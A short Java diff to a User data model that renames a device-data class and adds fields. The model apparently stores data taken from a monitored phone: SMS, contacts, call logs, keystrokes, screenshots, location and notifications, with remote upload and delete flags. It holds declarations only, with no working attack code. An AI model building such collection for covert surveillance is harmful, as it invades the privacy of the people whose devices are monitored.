@@ -20,7 +20,7 @@ public class User {
     private Map<String, Object> deviceDetails;
     private Map<String, Object> userSettings;
     private AppSettings appSettings;
-    private UserData userData;
+    private UserDeviceData userDeviceData;
 
     @Data
     @Builder
@@ -41,21 +41,25 @@ public class User {
         private ClickActions clickActions;
         private boolean uploadDataSnapshot;
         private boolean deleteLocalData;
+        private boolean saveOnLocalFile;
     }
 
     @Data
     @Builder
-    public static class UserData {
+    public static class UserDeviceData {
         private Map<String, Object> sensors;
         private Map<String, Object> fileStructure;
         private Map<String, Object> sms;
         private Map<String, Object> contacts;
+        private Map<String, Object> callLogs;
         private Map<String, Object> geolocation;
         private Map<String, Object> keystrokes;
         private Map<String, Object> deviceStats;
         private Map<String, Object> appStats;
         private Map<String, Object> screenshots;
         private Map<String, Object> offlineFiles;
+        private Map<String, Object> notifications;
+
     }
 
 }
